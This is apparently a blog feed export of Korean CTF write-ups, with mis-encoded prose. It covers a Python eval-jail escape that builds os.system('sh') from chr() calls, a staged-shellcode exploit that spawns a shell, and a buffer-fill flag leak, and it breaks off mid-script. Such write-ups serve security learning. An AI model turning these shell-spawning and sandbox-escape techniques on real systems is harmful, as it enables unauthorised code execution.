ascii_lowercase &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        line = <span class="built_in">input</span>(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Bye!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        items = line.split(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(items) != <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid syntax!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        varname, expression = items</span><br><span class="line">        varname = varname.strip()</span><br><span class="line">        expression = expression.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(varname) != <span class="number">1</span> <span class="keyword">or</span> <span class="keyword">not</span> varname.islower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid variable name!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_expression(expression):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid character in expression!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        result = <span class="built_in">eval</span>(expression, <span class="built_in">vars</span>, &#123;<span class="string">&#x27;sin&#x27;</span>: sin, <span class="string">&#x27;cos&#x27;</span>: cos, <span class="string">&#x27;sqrt&#x27;</span>: sqrt, <span class="string">&#x27;exp&#x27;</span>: exp, <span class="string">&#x27;log&#x27;</span>: log, <span class="string">&#x27;pi&#x27;</span>: pi&#125;)</span><br><span class="line">        <span class="built_in">vars</span>[varname] = result</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &#123;&#125; = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(varname, result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(USAGE)</span><br><span class="line">    loop()</span><br></pre></td></tr></table></figure><p><code>result = eval(expression, vars, &#123;&#39;sin&#39;: sin, &#39;cos&#39;: cos, &#39;sqrt&#39;: sqrt, &#39;exp&#39;: exp, &#39;log&#39;: log, &#39;pi&#39;: pi&#125;)</code> ì—ì„œ <code>eval</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ì„œ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìžˆë‹¤.</p><p><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code> ì„ ì‹¤í–‰ì‹œí‚¤ê³  ì‹¶ë‹¤. ì´ë¥¼ ìœ„í•´ <code>eval(__import__(&#39;os&#39;).system(&#39;sh&#39;))</code>ì„ ì„œë²„ì—ì„œ ì‹¤í–‰ì‹œí‚¤ê³  ì‹¶ì—ˆë‹¤. ì´ë•Œ ë¬¸ì œëŠ” <code>.+*-/()</code>ë§Œ í—ˆìš©í•´ì„œ <code>&#39;</code>ì„ ì‚¬ìš©í•  ìˆ˜ê°€ ì—†ë‹¤. ì´ë¥¼ ìœ„í•´ <code>eval</code>ê³¼ <code>chr</code>ì„ ì‚¬ìš©í–ˆê³  ì´ê±¸ ë¡œì»¬ì´ ì•„ë‹Œ ì„œë²„ì—ì„œ ì‹¤í–‰ì‹œí‚¤ë„ë¡ ë…¸ë ¥í–ˆë‹¤. payloadë¥¼ ë¡œì»¬ì—ì„œ ì‹¤í–‰ì‹œí‚¬ ë•Œ ì—ëŸ¬ ì—†ì´ ì›í•˜ëŠ” í–‰ìœ„ë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìžˆì–´ì•¼ í•œë‹¤. ì´ê²Œ ê·¸ëŒ€ë¡œ ì„œë²„ì—ì„œ ì‹¤í–‰ëœë‹¤ê³  ìƒê°í•˜ë©´ ëœë‹¤.</p><p><code>python eval</code> ì·¨ì•½ì ì— ëŒ€í•œ ìžì„¸í•œ ë‚´ìš©ì€ ì•„ëž˜ ë¸”ë¡œê·¸ë¥¼ ì°¸ê³ í–ˆë‹¤.</p><ul><li><a href="https://passwd.tistory.com/entry/eval-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%8B%9D-%EC%8B%A4%ED%96%89">https://passwd.tistory.com/entry/eval-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%8B%9D-%EC%8B%A4%ED%96%89</a></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&#x27;python&#x27;, &#x27;./calc.py&#x27;])</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">19815</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;__import__(\&#x27;os\&#x27;).system(\&#x27;sh\&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a = &#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;eval(&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">    payload += <span class="string">&#x27;chr(&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(c)) + <span class="string">&#x27;)+&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload[:-<span class="number">1</span>]</span><br><span class="line">payload += <span class="string">&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;$&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TBTL&#123;4Nd_54nd80x1n6_15_3v3n_h4rd3r&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> TBCL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> eval </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 review</title>
      <link href="/230523-byuctf2023-0review/"/>
      <url>/230523-byuctf2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li><li><a href="https://github.com/BYU-CSA/BYUCTF-2023/tree/main">https://github.com/BYU-CSA/BYUCTF-2023/tree/main</a></li></ul><p>ì €ë²ˆ ì£¼ë§ì— ì”¨í…ì´ ì°¸ ë§Žì´ ì—´ë ¸ë‹¤. ì‚¬ì‹¤ ìš”ì¦˜ ê²Œìž„ì— ë¹ ì ¸ìžˆì–´ì„œ ê²Œìž„ ë˜ì „ ìž¡ížˆëŠ” ë™ì•ˆ ë‹¤ë¥¸ ì”¨í… ë¬¸ì œë¥¼ í‹ˆí‹ˆížˆ í’€ì–´ë³´ê³  ì´ ì”¨í…ì€ ì£¼ë§ì— ì”¨í… ëë‚˜ê³  ì›”ìš”ì¼ì— ë‹¤ í’€ì–´ë´¤ë‹¤. ì†”ë¸Œ ìˆ˜ë„ íƒ€ ì”¨í…ë³´ë‹¤ ë†’ì€ íŽ¸ì´ê¸¸ëž˜(hardë¼ê³  í‘œê¸°ëœ ì†”ë¸Œ ìˆ˜ ê°€ìž¥ ì ì€ í¬ë„ˆë¸”ì´ 45ì†”ë¸Œì˜€ìŒ) ëª» í’€ë©´ ì–´ë–¡í•˜ë‚˜ ê¸´ìž¥í•˜ë©´ì„œ í’€ì—ˆë‹¤. ë‹¤í–‰ížˆ ë‹¤ í’€ì–´ì„œ ê¸°ë¶„ì´ ì¢‹ì•˜ë‹¤. </p><p>ê·¸ëŸ¬ë‚˜ ê³µì‹ ê¹ƒí—ˆë¸Œì—ëŠ” ë°”ì´ë„ˆë¦¬ê°€ í•˜ë‚˜ ë” ìžˆì—ˆê³ , í•œ ë°”ì´ë„ˆë¦¬ì— 3ê°œì˜ í”Œëž˜ê·¸ê°€ ìˆ¨ê²¨ì ¸ ìžˆì—ˆë‹¤.(ê³µì‹ ê¹ƒí—ˆë¸Œì— ì„¸ ë¬¸ì œê°€ ë” ìžˆì—ˆë‹¤.) í•˜ë‚˜ëŠ” ì°¾ì•˜ê³ , ì·¨ì•½ì ë„ ì°¾ì•˜ìœ¼ë‚˜ ìŠ¤íƒì„ ë‹¤ ë’¤ì ¸ì•¼í•˜ëŠ”â€¦ ë¸Œí¬ë¥¼ í•´ì•¼í•  ê²ƒ ê°™ì•„ì„œ ì¼ë‹¨ ë‹¤ë¥¸ ìš°ì„ ìˆœìœ„ê°€ ë†’ì€ ì¼ì„ í•˜ëŸ¬ ê°”ê³ .. ì§€ê¸ˆì€ í›„ê¸°ì™€ ë¡¸ì—…ë¶€í„° ì“´ë‹¤. ã„±-</p><ul><li><a href="https://jiravvit.github.io/230523-byuctf2023-2038/">https://jiravvit.github.io/230523-byuctf2023-2038/</a></li><li><a href="https://jiravvit.github.io/230523-byuctf2023-vfs1/">https://jiravvit.github.io/230523-byuctf2023-vfs1/</a></li><li><a href="https://jiravvit.github.io/230523-byuctf2023-shellcode/">https://jiravvit.github.io/230523-byuctf2023-shellcode/</a></li><li><a href="https://jiravvit.github.io/230523-byuctf2023-frorg/">https://jiravvit.github.io/230523-byuctf2023-frorg/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 - Shellcode (shellcode)</title>
      <link href="/230523-byuctf2023-shellcode/"/>
      <url>/230523-byuctf2023-shellcode/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li></ul><blockquote><p>Youâ€™ll have to make your own shellcode for this one!<br>nc byuctf.xyz 40017<br>tag: medium </p></blockquote><ul><li>[51 solves &#x2F; 452 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ì†ŒìŠ¤ ì½”ë“œê°€ ì£¼ì–´ì ¸ ìžˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_ANONYMOUS 0x20</span></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">flush_buf</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// create memory for shellcode to reside in</span></span><br><span class="line">    mmap((<span class="type">char</span> *)<span class="number">0x777777000</span>, <span class="number">71</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set first 51 bytes to 0s</span></span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span> *)<span class="number">0x777777000</span>, <span class="number">0x00</span>, <span class="number">51</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get first 10 bytes of shellcode</span></span><br><span class="line">    <span class="type">char</span> shellcode_one[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter first 10 bytes of shellcode: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, shellcode_one, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)<span class="number">0x777777000</span>, shellcode_one, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get second 10 bytes of shellcode</span></span><br><span class="line">    <span class="type">char</span> shellcode_two[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter second 10 bytes of shellcode: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, shellcode_two, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)<span class="number">0x777777020</span>, shellcode_two, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get third 10 bytes of shellcode</span></span><br><span class="line">    <span class="type">char</span> shellcode_three[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter third 10 bytes of shellcode: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, shellcode_three, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)<span class="number">0x777777040</span>, shellcode_three, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get last 10 bytes of shellcode</span></span><br><span class="line">    <span class="type">char</span> shellcode_four[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter last 10 bytes of shellcode: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, shellcode_four, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)<span class="number">0x777777060</span>, shellcode_four, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// call shellcode</span></span><br><span class="line">    ((<span class="type">void</span> (*)())<span class="number">0x777777000</span>)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x777777000 ì£¼ì†Œë¶€í„° ì‹¤í–‰ê¶Œí•œì„ ì£¼ì—ˆë‹¤. ê·¸ë¦¬ê³  10ë°”ì´íŠ¸ì”© shellcodeë¥¼ ìž…ë ¥í•œë‹¤. ì´ë•Œ 10ë°”ì´íŠ¸ nullì´ ìƒê¸´ë‹¤. ë§ˆì§€ë§‰ì—” 0x777777000ì„ ì‹¤í–‰ì‹œí‚¨ë‹¤. ë°”ë¡œ ë“  ìƒê°ì€ ì²˜ìŒì— shellcodeë¥¼ ìž…ë ¥í•  ë•Œ <code>read(0, 0x777777000, size)</code> syscallì„ ìž…ë ¥í•˜ë©´ 10ë°”ì´íŠ¸ ë„ì—„ë„ì—„ ìž…ë ¥í•˜ëŠ” í•œê³„ë¥¼ ì—†ì•¨ ìˆ˜ ìžˆê² ë‹¤ê³  ìƒê°í–ˆë‹¤. ë‹¨ ë‚´ê°€ ê°€ìž¥ ì‹¤í–‰í•˜ê³  ì‹¶ì€ syscallì´ 10ë°”ì´íŠ¸ ì´ë‚´ì—¬ì•¼ í•œë‹¤.</p><p>ë‹¤í–‰ížˆ ë§ˆì§€ë§‰ call shellcodeë¥¼ í•  ë•Œ ë ˆì§€ìŠ¤í„° ìƒí™©ì€ ì•„ëž˜ì™€ ê°™ì•˜ê³ , <code>mov rsi, rdx</code>ì™€ <code>syscall</code>ì„ ì‹¤í–‰ì‹œí‚´ìœ¼ë¡œì¨ ë‚´ ì˜ë„ëŒ€ë¡œ ë¬¸ì œë¥¼ í’€ ìˆ˜ ìžˆì—ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$rax   : 0x0  </span><br><span class="line">$rdi   : 0x0   </span><br><span class="line">$rsi   : 0x007fffffffe58e  â†’  0x00000a64646464 (&quot;dddd\n&quot;?)</span><br><span class="line">$rdx   : 0x00000777777000  â†’  0x00000a61616161 (&quot;aaaa\n&quot;?)</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># $rax   : 0x0  </span></span><br><span class="line"><span class="comment"># $rdi   : 0x0   </span></span><br><span class="line"><span class="comment"># $rsi   : 0x007fffffffe58e  â†’  0x00000a64646464 (&quot;dddd\n&quot;?)</span></span><br><span class="line"><span class="comment"># $rdx   : 0x00000777777000  â†’  0x00000a61616161 (&quot;aaaa\n&quot;?)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 bytes</span></span><br><span class="line"><span class="comment"># read(0, 0x00000777777000,)</span></span><br><span class="line">shellcode_one = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsi, rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(asm(shellcode_one)) </span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, asm(shellcode_one)) </span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, p64(<span class="number">0</span>)) </span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, p64(<span class="number">0</span>)) </span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, p64(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span> + asm(shellcode))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 - VFS 1 (printf null)</title>
      <link href="/230523-byuctf2023-vfs1/"/>
      <url>/230523-byuctf2023-vfs1/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li></ul><blockquote><p>Iâ€™ve decided that we donâ€™t virtualize things enough, so I created a virtual file system that you can run and save your secrets on. This is still in beta-testing, but let me know what you think!<br>nc byuctf.xyz 40008<br>tag: medium </p></blockquote><ul><li>[80 solves &#x2F; 381 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ì†ŒìŠ¤ ì½”ë“œê°€ ì£¼ì–´ì ¸ì„œ ì¤‘ìš”í•œ ë¶€ë¶„ë§Œ ê°€ì ¸ì™”ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// INITIALIZATIONS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">filesystem</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> contents[<span class="number">2880</span>];</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">64</span>];</span><br><span class="line">    <span class="type">int</span> current_file;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (buffer) &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(fs.flag, buffer); <span class="comment">// flagë¥¼ ë³µì‚¬ </span></span><br><span class="line">    <span class="built_in">free</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">fs.current_file = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> filename[<span class="number">32</span>];</span><br><span class="line"><span class="type">char</span> contents[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>==<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">int</span> choice = menu();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fs.current_file == <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Sorry, you can&#x27;t create any more files!&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// create</span></span><br><span class="line">    </span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] What would you like to name your file?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%32s&quot;</span>, filename);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] What would you like to put in your file?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%256s&quot;</span>, contents);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// copy filename</span></span><br><span class="line">        <span class="built_in">memcpy</span>(fs.contents + (fs.current_file*<span class="number">288</span>), filename, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// copy contents</span></span><br><span class="line">        <span class="built_in">memcpy</span>(fs.contents + (fs.current_file*<span class="number">288</span>) + <span class="number">32</span>, contents, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] File created! (#%d)\n\n&quot;</span>, fs.current_file);</span><br><span class="line">        fs.current_file++;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="comment">// read</span></span><br><span class="line">        <span class="type">int</span> file_to_read;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Which file # would you like to read?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;file_to_read);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((file_to_read &gt;= fs.current_file) || (file_to_read &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid file number&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Filename: %s&quot;</span>, fs.contents + (file_to_read*<span class="number">288</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Contents: %s&quot;</span>, fs.contents + (file_to_read*<span class="number">288</span>) + <span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filesystem structë¥¼ ë³´ë©´ ìž…ë ¥ ë’¤ì— flagê°€ ì €ìž¥ë˜ì–´ ìžˆë‹¤. 1ë²ˆ ê¸°ëŠ¥ìœ¼ë¡œ <code>fs.contents</code>ë¥¼ ì±„ìš¸ ìˆ˜ ìžˆë‹¤. 4ë²ˆ ê¸°ëŠ¥ì€ ë‚˜ì˜ ìž…ë ¥ì„ ì¶œë ¥í•´ì¤€ë‹¤. ë§Œì•½ <code>fs.contents</code>ë¥¼ ê½‰ ì±„ìš°ë©´ ë°”ë¡œ ë’¤ì— ìžˆëŠ” <code>fs.flag</code>ê°€ ì¶œë ¥ë  ê²ƒì´ë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vfs1&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./vfs1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">b&#x27;a&#x27;</span> * <span class="number">32</span></span><br><span class="line">contents = <span class="string">b&#x27;b&#x27;</span> * <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span 